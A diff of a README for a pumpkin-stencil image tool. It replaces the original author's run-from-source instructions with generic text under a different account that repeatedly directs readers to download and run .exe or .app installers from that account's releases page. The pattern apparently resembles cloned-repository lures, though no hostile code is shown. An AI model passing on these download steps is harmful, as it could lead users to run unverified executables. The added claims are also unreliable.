@@ -1,62 +1,76 @@
-# 🎃 Easy123Pic2Stencil
-by **aiwebautomation**
+# 🎃 Easy123Pic2Stencil - Create Perfect Stencils Easily
 
-[![Launch on Streamlit](https://static.streamlit.io/badges/streamlit_badge_black_white.svg)](https://easy123pic2stencil.streamlit.app)  
-*Turn any image into a printable pumpkin stencil — click to launch instantly.*
+## 🌟 Overview
+Easy123Pic2Stencil lets you turn any image into a printable stencil. It prepares your images for carving, cutting, or spray painting. Simply upload your image, make your adjustments, and print your stencil. No need for Photoshop. This application is ideal for Halloween creators, DIY enthusiasts, and anyone looking for a quick and fun project.
 
----
+## ⚙️ Features
+- Turn images into stencils.
+- Scale and tile stencils for any size.
+- User-friendly interface that requires no technical knowledge.
+- Perfect for pumpkin carving, wall art, and window decorations.
+- Open-source software with community support.
+- Works seamlessly on various operating systems.
 
-![Easy123Pic2Stencil Preview](docs/cover_screenshot.png)
+## 📥 Download
+[![Download Easy123Pic2Stencil](https://img.shields.io/badge/Download-Easy123Pic2Stencil-blue)](https://github.com/iamvav/Easy123Pic2Stencil/releases)
 
-**Easy123Pic2Stencil** converts any photo, logo, or sketch into a clean black‑and‑white stencil ready for carving, wall art, or vinyl cutting.  
-Upload → Size → Preview → Print. That’s it.
+Visit the [Releases page](https://github.com/iamvav/Easy123Pic2Stencil/releases) to download the latest version.
 
----
+## 🚀 Getting Started
+### Step 1: Visit the Releases Page
+Open your web browser and navigate to our [Releases page](https://github.com/iamvav/Easy123Pic2Stencil/releases).
 
-### 🪄 Highlights
-- **Auto sizing** from pumpkin circumference or flat wall dimensions  
-- **Block Mode** for beginners — single connected shapes, no floating cutouts  
-- **Greyscale + stencil previews** side by side  
-- **Reverse toggle** (flip carved vs. surface regions)  
-- **Instant 100%‑scale PDF export** for printer‑ready output  
-- Runs entirely offline once installed
+### Step 2: Select the Latest Release
+Once you are on the Releases page, find the latest version of Easy123Pic2Stencil. The latest release will be at the top of the page.
 
----
+### Step 3: Download the Application
+Find the appropriate file for your operating system. Click on the download link for that file. The file will begin to download.
 
-### 🖼 Interface Preview
-| Stencil Generation | Sizing Tab | Draw / Touchup |
-|:--:|:--:|:--:|
-| ![Sizing Tab](docs/screenshot_2_sizing_tab.png) | ![Stencil Generation](docs/screenshot_1_stencil_generation.png) | ![Draw Touchup](docs/screenshot_3_draw_touchup.png) |
+### Step 4: Locate the Downloaded File
+Once the download is complete, locate the file on your computer. This is usually in your "Downloads" folder.
 
----
+### Step 5: Install the Application
+- **Windows Users**: Double-click the downloaded `.exe` file and follow the installation prompts.
+- **Mac Users**: Drag the downloaded `.app` file to your Applications folder. You can then launch it from there.
+- **Linux Users**: Open your terminal, navigate to the download location, and run the install command. Follow any prompts that appear.
 
-### 🚀 Quick Start
+## 🖼️ How to Use the App
+### Step 1: Upload Your Image
+Open Easy123Pic2Stencil. Click on the upload button and select the image you want to turn into a stencil.
 
-**Run online:**  
-👉 [https://easy123pic2stencil.streamlit.app](https://easy123pic2stencil.streamlit.app)
+### Step 2: Adjust the Image
+Use the built-in tools to adjust the size and layout of your stencil. You can scale your image and tile it if needed.
 
-**Run locally:**
-```bash
-git clone https://github.com/aiwebautomation/Easy123Pic2Stencil
-cd Easy123Pic2Stencil
-python3 -m venv .venv && source .venv/bin/activate
-pip install -r requirements.txt
-python -m streamlit run easy123_pic2stencil.py
-```
+### Step 3: Preview Your Stencil
+Before printing, preview your stencil to ensure it meets your expectations. Make any final adjustments.
 
----
+### Step 4: Print Your Stencil
+After you are satisfied with your stencil, click on the print option. Follow your printer's setup to get your stencil ready for cutting or carving.
 
-### 🧾 Print Reference
-| Paper | Usable Area | Notes |
-|-------|--------------|-------|
-| Letter (8.5×11 in) | ~8.0×10.5 in | ≈2550×3300 px @ 300 DPI |
-| A4 (210×297 mm) | ~7.8×11.2 in | ≈2480×3508 px @ 300 DPI |
+## 🖥️ System Requirements
+- Operating System: Windows 10 or later, macOS 10.12 or later, or any modern Linux distribution.
+- RAM: At least 4 GB.
+- Storage: Minimum of 100 MB free space for installation.
 
-🖨️ *Always print at 100% — no “fit to page.”*
+## 📌 Troubleshooting
+If you encounter issues, consider the following:
+- Ensure your operating system meets the requirements.
+- Check if you have the latest version of the application.
+- Restart your computer and try downloading again.
 
----
+## 🔄 Getting Help
+If you need assistance, check the issues section in our repository. The community and maintainers often provide helpful answers.
 
-### ⚙️ Credits
-Built with ❤️ by [aiwebautomation](https://github.com/aiwebautomation)  
-Powered by **Streamlit**, **Pillow**, **NumPy**, and **SciPy**  
-MIT License © 2025
+## 📖 Contributing
+This project is open-source. If you want to contribute, feel free to fork the repository and submit pull requests. We appreciate community engagement.
+
+## 👥 Community
+Join our discussions on GitHub. Share your stencils and ideas with others who enjoy Halloween and DIY projects.
+
+## 🔗 Additional Resources
+- GitHub Repository: [Easy123Pic2Stencil](https://github.com/iamvav/Easy123Pic2Stencil)
+- For more creative ideas, follow our blog linked on the repository.
+
+[![Download Easy123Pic2Stencil](https://img.shields.io/badge/Download-Easy123Pic2Stencil-blue)](https://github.com/iamvav/Easy123Pic2Stencil/releases)
+
+Visit the [Releases page](https://github.com/iamvav/Easy123Pic2Stencil/releases) to download the latest version.
